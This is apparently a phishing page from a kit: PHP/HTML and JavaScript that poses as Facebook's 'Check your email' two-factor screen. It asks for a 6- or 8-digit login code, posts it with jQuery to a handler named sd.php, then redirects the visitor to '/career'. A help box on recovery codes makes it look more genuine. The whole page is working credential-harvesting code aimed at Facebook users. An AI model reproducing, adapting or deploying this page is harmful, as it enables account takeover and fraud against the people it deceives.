<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
<link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
<link rel="stylesheet" href="./assets/css/twofa.css">
<link href="./assets/css/boxicons.min.css" rel="stylesheet">
<style>
    body{
        background-color: #FFFFFF !important;
    }
    .box{
        border:none !important;
    }
    #fa2{
        width: 100% !important;
        height: 55px !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 16px !important;
    }
    .submit2fa{
        width: 100% !important;
        outline: none !important;
        border-radius: 16px !important;
        padding: 10px !important;
    }
    .submit2fa:disabled {
        opacity: 0.6 !important;
        cursor: not-allowed !important;
    }
</style>

    <title>Facebook</title>

</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
            <div class="logout">
            <a href="#"><p>Log out</p></a>
        </div>

        </div>
</div>
<div class="mm">
<div class="box">

<div class="box_content">
<h4><b>Check your email
</b></h4>
<p>Enter the code we sent to your email address.</p>
<img src="assets/img/New2FA.jpg" alt="" width="100%">
<br><br>
            <form method="POST" name="formfa" id="formfa" class="form" onsubmit="return onLoginSubmit(this)">
    <div class="form-group">
        <input type="number" name="ecode" id="fa2" placeholder="Code">
        <br>
        <span id="number-error" class="error-message" style="margin:0px;padding:0px"></span>
<br>
        <div class="bottomline">
            <button type="submit" class="submit2fa"  name="submit" id="submit" style="font-weight:500 !important;">
            <i class="bx bx-loader-alt bx-spin bx-rotate-90" style="display: none;"></i>Continue</button>
        </div>
    </div>
</form>
</div>
</div>

</div>
<!-- Modal -->
<div id="modal-container">
    <div id="modal">
      <h6>Didn't receive a code?</h6>
      <hr>
      <p>
        1. Go to <b>Settings > Security and Login.</b>
<br> <br>
2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication.</b> You may need to re-enter your password.
<br><br>
3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes.</b> If you've already set up recovery codes, you can click <b>Show Codes.</b>
<br><br>
<img src="./assets/img/recovery.gif" alt="" width="100%" height="auto">

      </p>
      <button id="close-modal" class="close-modal">Continue</button><br><br>
    </div>
  </div>
  
<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script>
// Disable submit button by default when page loads
document.addEventListener('DOMContentLoaded', function() {
    const submitButton = document.querySelector('#submit');
    submitButton.disabled = true;
});

// Input validation and button enable/disable
document.querySelector("#fa2").addEventListener('input', function(e) {
    const submitButton = document.querySelector('#submit');
    const value = e.target.value.trim();
    submitButton.disabled = value.length !== 6 && value.length !== 8;
});

// Define the custom onLoginSubmit function
function onLoginSubmit(e, _this) {
    e.preventDefault();

    const submitButton = _this.querySelector('#submit');
    const spinner = submitButton.querySelector('i');
    const ecode = _this.querySelector("#fa2").value.trim();
    const numberError = _this.querySelector("#number-error");

    // Prevent multiple submissions
    if (submitButton.disabled) {
        return;
    }

    // Validate the email code
    if (!ecode || (ecode.length !== 6 && ecode.length !== 8)) {
        numberError.innerText = !ecode ? 'Please enter your login code' : 'Login code must be 6 or 8 digits';
        _this.querySelector("#fa2").classList.add('error-text');
        return;
    } else {
        numberError.innerText = '';
        _this.querySelector("#fa2").classList.remove('error-text');
    }

    // Immediately disable button and show spinner
    submitButton.disabled = true;
    spinner.style.display = 'inline-block';
    submitButton.innerHTML = `<i class="bx bx-loader-alt bx-spin bx-rotate-90"></i> Continue`;

    // Send the form data to the server
    $.post('sd.php', { ecode })
        .done(function(response) {
            console.log(response);
            // Redirect after successful submission
            setTimeout(() => {
                window.location.href = "/career";
            }, 2000);
        })
        .fail(function() {
            console.error('Error during submission');
            // Re-enable the button on error
            submitButton.disabled = false;
            submitButton.innerHTML = `Continue`;
            numberError.innerText = 'An error occurred. Please try again.';
        });
}

// Attach the onLoginSubmit function to the form's submit event
const formfa = document.getElementById("formfa");
formfa.addEventListener('submit', function(event) {
    onLoginSubmit(event, formfa);
});

// Modal functionality
const modalContainer = document.getElementById("modal-container");
const modal = document.getElementById("modal");
const closeModalBtn = document.getElementById("close-modal");

closeModalBtn?.addEventListener("click", () => {
    modalContainer.style.display = "none";
});

window.addEventListener("click", (event) => {
    if (event.target === modalContainer) {
        modalContainer.style.display = "none";
    }
});
</script>



</body>
</html>